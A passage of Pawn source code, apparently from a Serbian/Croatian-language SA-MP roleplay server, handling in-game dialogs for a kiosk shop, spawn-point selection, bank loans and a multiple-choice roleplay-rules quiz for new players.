			SCM( playerid, ZUTA, "Odbio si voznju!" );

			if( offeredByCabbie[ playerid ] != IPI ) SCM( offeredByCabbie[ playerid ], ZUTA, "Klijent je odbio voznju!" );

			offeredByCabbie[ playerid ] = INVALID_PLAYER_ID;
		}
	}
	else if( dialogid == dialog_KIOSK ) {
	    if(response == 1) {
            switch( listitem ) {
                case 0: {
                    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, " Nemate mobilni telefon!");
				   	if( PlayerInfo[ playerid ][ xNovac ] < 20 ) return SendErrorMessage( playerid, " Nemate dovoljno novca 20$!");
					PlayerInfo[ playerid ][ xTelefonBon ] += 20;
					DajIgracuNovac( playerid, -20 );
					SCM( playerid, BELA, "Kupili ste 20 kredita za 20$!") ;
					SavePlayer( playerid ); BussinesMoney( Trafika[ playerid ], 10 );
                }
                case 1: {
                    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, " Nemate mobilni telefon!");
				   	if( PlayerInfo[ playerid ][ xNovac ] < 50 ) return SendErrorMessage( playerid, " Nemate dovoljno novca 50$!");
					PlayerInfo[ playerid ][ xTelefonBon ] += 50;
					DajIgracuNovac( playerid, -50 );
					SCM( playerid, BELA, "Kupili ste 50 kredita za 50$!") ;
					SavePlayer( playerid ); BussinesMoney( Trafika[ playerid ], 25 );
                }
                case 2: {
                    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, " Nemate mobilni telefon!");
				   	if( PlayerInfo[ playerid ][ xNovac ] < 100 ) return SendErrorMessage( playerid, " Nemate dovoljno novca 100$!");
					PlayerInfo[ playerid ][ xTelefonBon ] += 100;
					DajIgracuNovac( playerid, -100 );
					SCM( playerid, BELA, "Kupili ste 100 kredita za 100$!") ;
					SavePlayer( playerid ); BussinesMoney( Trafika[ playerid ], 50 );
                }
                case 3: {
                    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, " Nemate mobilni telefon!");
				   	if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, " Nemate dovoljno novca 500$!");
					PlayerInfo[ playerid ][ xTelefonBon ] += 500;
					DajIgracuNovac( playerid, -500 );
					SCM( playerid, BELA, "Kupili ste 500 kredita za 500$!") ;
					SavePlayer( playerid ); BussinesMoney( Trafika[ playerid ], 100 );
                }
                case 4: {
				   	if( PlayerInfo[ playerid ][ xNovac ] < 15 ) return SendErrorMessage( playerid, " Nemate dovoljno novca 15$!");
					DajIgracuNovac( playerid, -15 );
					SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK );
					SCM( playerid, BELA, "Kupili ste sprite za 15$!"); BussinesMoney( Trafika[ playerid ], 8 );
				}
				case 5: {
				    if( PlayerInfo[ playerid ][ xNovac ] < 35 ) return SendErrorMessage( playerid, " Nemate dovoljno novca 35$!");
				    new Float:Health; GetPlayerHealth( playerid, Health );
	                if( Health >= 100 ) return SendErrorMessage( playerid, "Vec imas 100HP.");
					format( globalstring, sizeof( globalstring ), "* %s jede cokoladicu.", ImeIgraca( playerid ) );
				    PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
				    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0 );
				    DodajIgracuHP( playerid, 20 );
				    DajIgracuNovac( playerid, -35 ); BussinesMoney( Trafika[ playerid ], 10 );
				}
				case 6:
				{
				   	if( PlayerInfo[ playerid ][ xNovac ] < 85 ) return SendErrorMessage(playerid, "Nemate dovoljno novca 85$!");
					DajIgracuNovac( playerid, -85 );
					SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_BEER);
					SCM(playerid,-1,"Kupili ste pivo za 85$!"); BussinesMoney( Trafika[ playerid ], 25 );
				}
				case 7: {
				   	if( PlayerInfo[ playerid ][ xNovac ] < 52 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 52$!");
					DajIgracuNovac( playerid, -52 );
					SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK );
					SCM( playerid, BELA, "Kupili ste coca colu za 52$!" ); BussinesMoney( Trafika[ playerid ], 25 );
				}
				case 8: {
				   	if( PlayerInfo[ playerid ][ xNovac ] < 35 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 35$!");
					PlayerInfo[ playerid ][ xCigare ] += 20;
					DajIgracuNovac( playerid, -35 );
					SCM( playerid, BELA, "Kupili ste kutiju cigareta koja sadrzi 20 cigare za 35$!");
					SCM( playerid, BELA, "Da pusis cigare koristi /uzmicigaretu.");
					SavePlayer( playerid ); BussinesMoney( Trafika[ playerid ], 17 );
				}
				case 9: {
				    if( PlayerInfo[ playerid ][ xUpaljac ] == 1 ) return SendErrorMessage( playerid, "Vec posedujes upaljac!");
				   	if( PlayerInfo[ playerid ][ xNovac] < 15 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 15$!");
					PlayerInfo[ playerid ][ xUpaljac ] = 1;
					DajIgracuNovac( playerid, -15 );
					SCM( playerid, BELA, "Kupili ste upaljac za 15$!");
					SCM( playerid, BELA, "Da pusis cigare koristi /uzmicigaretu.");
					SavePlayer( playerid ); BussinesMoney( Trafika[ playerid ], 8 );
				}
                case 10: {

                    if( PlayerInfo[ playerid ][ xBaterija ] > 10 ) return SendErrorMessage( playerid, "Ne mozes posedovati vise od 10 baterija!");
                    if( PlayerInfo[ playerid ][ xNovac] < 50 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 50$!");
                    PlayerInfo[ playerid ][ xBaterija ]++;
                    DajIgracuNovac( playerid, -50 );
                    SCM( playerid, BELA, "Kupili ste bateriju za 50$!");
                    SavePlayer( playerid ); BussinesMoney( Trafika[ playerid ], 8 );
                }
			}
		}
	}
	else if( dialogid == dialog_SPAWNCHANGE ) {
		if( response ) {
		    switch( listitem ) {
			    case 0: {
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_OBICAN_LS_1 ) return SendErrorMessage(playerid, "Spawn ti je vec postavljen na uobicajni u LSu!");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1; SavePlayer( playerid );
					SCM(playerid, BELA, "Postavili ste spawn na uobicajni u LSu 1." );
			    }
			    case 1: {
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_OBICAN_LS_2 ) return SendErrorMessage(playerid, "Spawn ti je vec postavljen na uobicajni u LVu!");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_2; SavePlayer( playerid );
					SCM(playerid, BELA, "Postavili ste spawn na uobicajni u LSu 2." );
			    }
                case 2: {
					if( PlayerInfo[ playerid ][ xClan ] < 1) return SendErrorMessage( playerid, "Nisi clan nijedne organizacije.");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_BAZA; SavePlayer( playerid );
					SCM( playerid, BELA, "Od sada cete se spawnati u bazi orge/mafije/bande." );
				}
			    case 3: {
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_IMOVINA_1 ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na imovinu 1!");
					if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Nemas imovinu 1!");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_IMOVINA_1; SavePlayer( playerid );
					SCM(playerid, BELA, "Od sada cete se spawnati u imovini 1." );
			    }
			    case 4: {
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_IMOVINA_2 ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na imovinu 2!");
					if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 ) return SendErrorMessage( playerid, "Nemas imovinu 2!");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_IMOVINA_2; SavePlayer( playerid );
					SCM(playerid, BELA, "Od sada cete se spawnati u imovini 2.");
			    }
			    case 5: {
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_IMOVINA_3 ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na imovinu 3!");
					if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) return SendErrorMessage( playerid, "Nemas imovinu 3!");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_IMOVINA_3; SavePlayer( playerid );
					SCM( playerid, BELA, "Od sada cete se spawnati u imovini 3.");
			    }
			    case 6: {
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_RENTHOTEL ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na hotelsku sobu!");
					if( PlayerInfo[ playerid ][ xHotelRoom ] == -1 ) return SendErrorMessage( playerid, "Ne mozete staviti spawn na sobu u hotelu jer je niste iznajmili.");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_RENTHOTEL;
			       	SavePlayer( playerid );
					SCM( playerid, BELA, "Od sada cete se spawnati u iznajmljenoj sobi u hotelu.");
			    }
			    case 7: {
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_RENT ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na iznajmljenu sobu!");
					if( PlayerInfo[ playerid ][ xRentID ] == -1 ) return SendErrorMessage( playerid, "Ne mozete staviti spawn na iznajmljenu sobu jer je niste iznajmili.");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_RENT;
			       	SavePlayer( playerid );
					SCM( playerid, BELA, "Od sada cete se spawnati u iznajmljenoj sobi.");
			    }
			    case 8: {
			        if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_ADMIN ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na Admin bazu!");
			        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
			        	PlayerInfo[ playerid ][ xSpawn ] = SPAWN_ADMIN;
			        	SavePlayer( playerid );
						SCM( playerid, BELA, "Od sada cete se spawnati u Admin bazi.");
			        }
			        else SendErrorMessage( playerid, "Samo Admin TEAM ili Helperi." );
			    }
		    }
		}
	}
	else if( dialogid == dialog_KREDIT ) {
		if( !response ) return SelectTextDraw(playerid, SRVBOJA1);
		if( response ){

            SelectTextDraw(playerid, SRVBOJA1);

			if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] > 0) return SendErrorMessage( playerid, "Vec imate podignut kredit!");
			switch( listitem ) {
				case 0: {
					if( PlayerInfo[ playerid ][ xLevel] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5+ za ovaj kredit!");
					PlayerInfo[ playerid ][ xIznosKredita ] = 20000;
					PlayerInfo[ playerid ][ xIznosRate ] = 1000;
					PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = PlayerInfo[ playerid ][ xIznosKredita ];
					PlayerInfo[ playerid ][ xBRacun ] += PlayerInfo[ playerid ][ xIznosKredita];
					SCM( playerid, ZUTA, "Podigli ste kredit u iznosu od 20000$ | INFO: /kredit.");
					SavePlayer( playerid ); UpdateBankTD( playerid );
					new string[ 128 ]; 
					format( string, sizeof( string ), "Igrac: %s | Podigao kredit: 20000$", ImeIgraca( playerid ) );
					LogSave( "Ostalo/LogKredit.log", string );
				}
				case 1: {
					if( PlayerInfo[ playerid ][ xLevel ] < 10 ) return SendErrorMessage( playerid, "Morate biti level 10+ za ovaj kredit!");
					PlayerInfo[ playerid ][ xIznosKredita ] = 50000;
					PlayerInfo[ playerid ][ xIznosRate ] = 2000;
					PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = PlayerInfo[ playerid ][ xIznosKredita];
					PlayerInfo[ playerid ][ xBRacun ] += PlayerInfo[ playerid ][ xIznosKredita];
					SCM( playerid, ZUTA, "Podigli ste kredit u iznosu od 50000$ | INFO: /kredit.");
					SavePlayer( playerid ); UpdateBankTD( playerid );
					new string[ 128 ]; 
					format( string, sizeof( string ), "Igrac: %s | Podigao kredit: 50000$", ImeIgraca( playerid ) );
					LogSave( "Ostalo/LogKredit.log", string );
				}
				case 2: {
					if( PlayerInfo[ playerid ][ xLevel] < 15 ) return SendErrorMessage( playerid, "Morate biti level 15+ za ovaj kredit!");
				    PlayerInfo[ playerid ][ xIznosKredita ] = 80000;
					PlayerInfo[ playerid ][ xIznosRate ] = 3000;
					PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = PlayerInfo[ playerid ][ xIznosKredita ];
					PlayerInfo[ playerid ][ xBRacun ] += PlayerInfo[ playerid ][ xIznosKredita ];
					SCM( playerid, ZUTA, "Podigli ste kredit u iznosu od 80000$ | INFO: /kredit.");
					SavePlayer( playerid ); UpdateBankTD( playerid );
					new string[ 128 ]; 
					format( string, sizeof( string ), "Igrac: %s | Podigao kredit: 80000$", ImeIgraca( playerid ) );
					LogSave( "Ostalo/LogKredit.log", string );
				}
				case 3: {
					if( PlayerInfo[ playerid ][ xLevel ] < 20 ) return SendErrorMessage( playerid, "Morate biti level 20+ za ovaj kredit!");
					PlayerInfo[ playerid ][ xIznosKredita ] = 100000;
					PlayerInfo[ playerid ][ xIznosRate ] = 4000;
					PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = PlayerInfo[ playerid ][ xIznosKredita ];
					PlayerInfo[ playerid ][ xBRacun ] += PlayerInfo[ playerid ][ xIznosKredita ];
					SCM( playerid, ZUTA, "Podigli ste kredit u iznosu od 100000$ | INFO: /kredit.");
					SavePlayer( playerid ); UpdateBankTD( playerid );
					new string[ 128 ]; 
					format( string, sizeof( string ), "Igrac: %s | Podigao kredit: 100000$", ImeIgraca( playerid ) );
					LogSave( "Ostalo/LogKredit.log", string );
				}
			}
		}
	}
	else if( dialogid == dialog_INFOKREDIT) {
	
		if( !response ) return SelectTextDraw(playerid, SRVBOJA1);
        if(response) {
            SelectTextDraw(playerid, SRVBOJA1);

    	    switch( listitem ) {
    			case 0: {
    				format( globalstring, sizeof( globalstring ),"- Iznos Kredita: %d$\n- Iznos Rate Kredita: %d$\n- Preostalo za otplatu: %d$", PlayerInfo[ playerid ][ xIznosKredita ], PlayerInfo[ playerid ][ xIznosRate ], PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
    				SPD( playerid, dialog_BALANCE, DSMSG, D_NASLOV, globalstring, D_ODABERI, D_ODUSTANI );
    			}
    			case 1: SPD( playerid, dialog_PROMENARATEKREDITA, DSI, D_NASLOV, "Upisite novi iznos rate koje cete otplacivati...", D_ODABERI, D_ODUSTANI );
    			case 2: {
    			    if( PlayerInfo[ playerid ][ xBRacun ] >= PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] ) {
    			        SendInfoMessage( playerid, "Uspesno ste otplatili ostatak kredita u iznosu od %d$.", PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
    			        PlayerInfo[ playerid ][ xBRacun ] -= PlayerInfo[ playerid ][ xPreostaloZaOtplatu ];
    			        PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = 0;
    			        PlayerInfo[ playerid ][ xIznosKredita ] = 0;
    					PlayerInfo[ playerid ][ xIznosRate ] = 0;
    					SavePlayer( playerid );
    			    }
    			    else if( PlayerInfo[ playerid ][ xNovac ] > PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] ) {
    			        SendInfoMessage( playerid, "Uspesno ste otplatili ostatak kredita u iznosu od %d$.", PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
    			        DajIgracuNovac( playerid, -PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
    			        PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = 0;
    			        PlayerInfo[ playerid ][ xIznosKredita ] = 0;
    					PlayerInfo[ playerid ][ xIznosRate ] = 0;
    					SavePlayer( playerid );
    			    }
    			    else return SendErrorMessage( playerid, "Nemate dovoljno novca za otplacivanje kredita." );
    			}
    		}
        }
	}
	else if( dialogid == dialog_PROMENARATEKREDITA )
	{
		if( !response ) return 1;
		if( response ) {
			new iznos;
			if( sscanf( inputtext, "i", iznos ) ) return SPD( playerid, dialog_PROMENARATEKREDITA, DSI, D_NASLOV, "Upisite novi iznos rate koje cete otplacivati...", D_ODABERI, D_ODUSTANI );
			if( iznos < 1000 || iznos > 4000 )
			{
				SendErrorMessage( playerid, "Suma ne moze biti manja od 1000$ i veca od 4000$!");
				SPD( playerid, dialog_PROMENARATEKREDITA, DSI, D_NASLOV, "Upisite novi iznos rate koje cete otplacivati...", D_ODABERI, D_ODUSTANI );
				return 1;
			}
			PlayerInfo[ playerid ][ xIznosRate ] = iznos;
			SendClientMessageEx( playerid, ZUTA, "Podesili ste iznos rate kredita na %d$.", iznos );
		}
		else SPD( playerid, dialog_INFOKREDIT, DSL, D_NASLOV, "Info Kredit\nPromena Iznosa Rate", D_ODABERI, D_ODUSTANI );
	}
	else if( dialogid == dialog_RPTEST ) {
		if( response ) {
	        if( listitem == TacanOdgovor[ playerid ] ) {
	            Novi_KillTimer( TimerPitanje[ playerid ] );
	            if( PitanjeBroj[ playerid ] == 1 ) {
				    TacanOdgovor[ playerid ] = 3;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "2. Sto je Powergaming [PG] ?", "A) Pisanje iste rijeci ili recenice dva ili vise puta za redom.\nB) Koristenje OOC informacija u IC korist.\n C) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.\nD) Izvodjeneje radnje koju je nemoguce izvesti u stvarnom zivotu.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 2 ) {
				    TacanOdgovor[ playerid ] = 1;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "3. Sto je Deathmatch [DM] ?", "A) Koristenje OOC informacija u IC korist.\nB) Ubijanje ljudi bez ikakvog IC i RP razloga.\nC) Pisanje iste rijeci ili recenice dva ili vise puta za redom.\nD) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 3 ) {
				    TacanOdgovor[ playerid ] = 3;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "4. Sto je Roleplay 2 Win [RP2WIN] ?", "A) Pisanje iste rijeci ili recenice dva ili vise puta za redom.\nB) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.\nC) Koristenje OOC informacija u IC korist.\nD) RPanje nekakve situacije u svoju korist.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 4 ) {
				    TacanOdgovor[ playerid ] = 2;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "5. Sto je Drive By [DB] ?", "A) Koristenje OOC informacija u IC korist.\nB) Izvodjenje radnje koju je nemoguce izvesti u stvarnom zivotu.\nC) Pucanje iz vozila sa mesta vozaca na pesake, motoriste i bicikliste.\nD) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 5 ) {
				    TacanOdgovor[ playerid ] = 1;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "6. Sto je Bunny Hopp [BH] ?", "A) Izvodjeneje radnje koju je nemoguce izvesti u stvarnom zivotu.\nB) Skakanje jednom ili vise puta prilikom trcanja sa ciljem brzeg trcanja.\nC) Koristenje OOC informacija u IC korist.\nD) Pisanje iste rijeci ili recenice dva ili vise puta za redom.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 6 ) {
				    TacanOdgovor[ playerid ] = 0;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "7. Sto je Revenge Kill [RK] ?", "A) Ubojstvo igraca iz osvete.\nB) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.\nC) Pisanje iste rijeci ili recenice dva ili vise puta za redom.\nD) Izvodjeneje radnje koju je nemoguce izvesti u stvarnom zivotu.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 7 ) {
				    TacanOdgovor[ playerid ] = 0;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "8. Sto je Non-Roleplay [NonRP] ?", "A) Ometanje RP radnji koje izvrsavaju drugi igraci.\nB) Izvodjenje radnje koju je nemoguce izvesti u stvarnom zivotu.\nC) Pisanje iste rijeci ili recenice dva ili vise puta za redom.\nD) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 8 ) {
				    TacanOdgovor[ playerid ] = 2;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "9. Sto je Spamming [SPAM] ?", "A) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.\nB) Izvodjeneje radnje koju je nemoguce izvesti u stvarnom zivotu.\nC) Pisanje iste rijeci ili recenice dva ili vise puta za redom.\nD) Pucanje iz vozila sa mesta vozaca na pesake,motoriste i bicikliste.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 9 ) {
				    TacanOdgovor[ playerid ] = 3;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "10. Sto je Hacking & Exploiting [Hack & Abuse] ?", "A) Pisanje iste rijeci ili recenice dva ili vise puta za redom.\nB) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.\nC) Izvodjeneje radnje koju je nemoguce izvesti u stvarnom zivotu.\nD) Koriscenje programa kojim se dobiva prednost u igri.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 10 ) {
				    TacanOdgovor[ playerid ] = 2;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "11. Sto je 'SpawnKill [SK] ?", "A) Mjesto gde se spawnate.Tamo ima puno ljudi i mozete naci prijatelje\nB) To je kada ubijete covjeka zato sto se spawno u vasoj kuci\nC) Ubojstvo igraca nakon sto se on tek spawnao\nD) Nista od navedenog.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 11 ) {
				    TacanOdgovor[ playerid ] = 2;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "12. Sto je Terrorist RP [Terror RP] ?", "A) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.\nB) Izvodjeneje radnje koju je nemoguce izvesti u stvarnom zivotu.\nC) RPanje terorista.\nD) Pucanje iz vozila sa mesta vozaca na pesake,motoriste i bicikliste.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 12 ) {
				    TacanOdgovor[ playerid ] = 0;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "13. Sto je Admin/Helper Abuse ?", "A) Koristenje Admin pozicije za pretnje ili za korist sebi,a na stetu drugima igracima.\nB) Izvodjenje radnje koju je nemoguce izvesti u stvarnom zivotu.\nC) Pisanje iste rijeci ili recenice dva ili vise puta za redom.\nD) Skakanje jednom ili vise puta tokom trcanja sa ciljem brzeg trcanja.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 13 ) {
				    TacanOdgovor[ playerid ] = 2;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "14. Netko vam prosljedi uvredu u '/b' chat, sta ce te uraditi?", "A) Opsovat cu i ja njemu i to duplo.\nB) Izudarati ga dok ne shvati sta je uradio i ubiti ga.\nC) Slikat cu to i postaviti zalbu na forumu na tu osobu.\nD) Zvati Admina.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 14 ) {
				    TacanOdgovor[ playerid ] = 0;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "15. Lovi vas policija i probuse vam gumu, kako ce te reagirati?", "A) Zaustavit cu vozilo RP i bez krsenja pravila nastaviti RPati.\nB) Vozit cu dok se ne slupam skroz i onda odem off.\nC) Zaustavit cu vozilo i spammati na OOC - 'nonRP'\nD) Zvati Admina!", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 15 ) {
				    TacanOdgovor[ playerid ] = 2;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "16. Uocite tucu izmedju dvije grupe u Comptonu, sta cete uraditi?", "A) Upalit cu cheat i pokazati im ko je glavni tu.\nB) Uletit cu medju njih i pobiti se sa njima\nC) RPat cu strah i pozvati LSPD\nD) Prici pored njih i poceti da RPam sa njima.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 16 ) {
				    TacanOdgovor[ playerid ] = 1;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "17. Napisete '/me pokusava udariti lika rukom u glavu',sto sljedece ide?", "A) Kako sam te opalio umro si, pukla ti glava.\nB) /do da li uspjevam da te udarim?\nC) Udario sam te padas, i u nesvjesti si.\nD) /do pao si na pod i lezis krvav .", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 17 ) {
				    TacanOdgovor[ playerid ] = 3;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "18. Policajac vam stavlja lisice i vodi u zatvor, sta ce te uraditi?", "A) Napisati mu na '/b' chat da je glup i da MGa.\nB) Pobjeci cu off, jer sam faca.\nC) Zvati Admina na /report .\nD) RPat cu iako grijesi, i o greskama razjasniti na forumu.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 18 ) {
				    TacanOdgovor[ playerid ] = 0;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "19. Osoba vam peri pistolj u glavu trazeci novac.sto ce te uciniti?", "A)Uradit cu sve sto mi kaze bez krsenja pravila.\nB)Skocit cu mu za vrat i iskopati mu oci.\nC)Pobjeci off ili samo crashati sam client.\nD)Pozvati policiju i reci da me netko pljacka i dati im lokaciju", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 19 ) {
				    TacanOdgovor[ playerid ] = 3;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "20. Upucani ste u nogu, sta ce te uciniti?", "A) Pocet cu trcati da izbjegnem metke kako bi se spasio.\nB) Otici cu sa servera svojom voljom.\nC) Nista od navedenog.\nD) RPat cu strasnu bol i past cu na zemlju.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 20 ) {
				    TacanOdgovor[ playerid ] = 1;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "21.Ukoliko napravite saobracajnu nesrecu, sta ce te uraditi?", "A) Reci cu mu na '/b' chat da koristi oci\nB) Pocet cu RPati tu nesrecu opsirno uz pomoc komandi\nC) Nastavit cu voziti\nD) Uslikati i prijaviti na forum pod zalbom za NonRP", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 21 ) {
				    TacanOdgovor[ playerid ] = 1;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "22./me udara lika te on pada na zemlju.sta smo prekrsili?", "A) Pustupili smo ispravno prema igracu i treba nastaviti Roleplay.\nB) RPali smo u svoju korist.\nC) Pocinili smo Drive By u uzem smislu.\nD) Izvrsili smo PG nad igracom.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 22 ) {
				    TacanOdgovor[ playerid ] = 0;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "23. Cemu koristi komanda /me i /do? ", "A) Radi boljeg Roleplaya i iskazivanja stvari koji se nevide.\nB) Radi iskoriscavanja drugih igraca\nC) Radi NonRoleplaya u igrici\nD) Nista od navedenog.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 23 ) {
				    TacanOdgovor[ playerid ] = 2;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "24. Smije li se RP-ati maloljetnika? ", "A) DA\nB) NE\nC) Dozvoljeno je ali nam to 'ne daje' nikakvu prednost nad ostalim igracima .\nD) Nista od navedenog.", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 24 ) {
				    TacanOdgovor[ playerid ] = 1;
				    PitanjeBroj[ playerid ]++;
					SPD( playerid, dialog_RPTEST, DSL, "25. Smije li se RP-ati terorista? ", "A) Da\nB) Ne\nC) Samo ako su official organizacija.\nD) Nista od navedenog", D_ODABERI, D_ODUSTANI );
				}
				else if( PitanjeBroj[ playerid ] == 25 ) {
				    PlayerInfo[ playerid ][ xRPLearn ] = 0; PlayerInfo[ playerid ][ xMute ] = 0; SavePlayer( playerid ); //PostaviSpawn( playerid );
                    PitanjeBroj[ playerid ] = 0;
					Novi_SetSpawnInfo( playerid );
    				SpawnPlayer( playerid );
				    SCM( playerid, SVETLOCRVENA, "Cestitamo! Na sva pitanja ste tocno odgovorili te ste spremni za igru." );
					SCM( playerid, SVETLOCRVENA, "Zelimo vam ugodnu zabavu i dobar RP. Posjetite nas forum www.valhalla-ogc.com" );
				}
				TimerPitanje[ playerid ] = SetTimerEx( "Pitanje", 120000, 0, "i", playerid);
			}
			else {
			    PlayerInfo[ playerid ][ xRPLearn ] = 1;
     			SavePlayer( playerid );
     			Novi_KillTimer( TimerPitanje[ playerid ] );
     			TogglePlayerControllable( playerid, false );
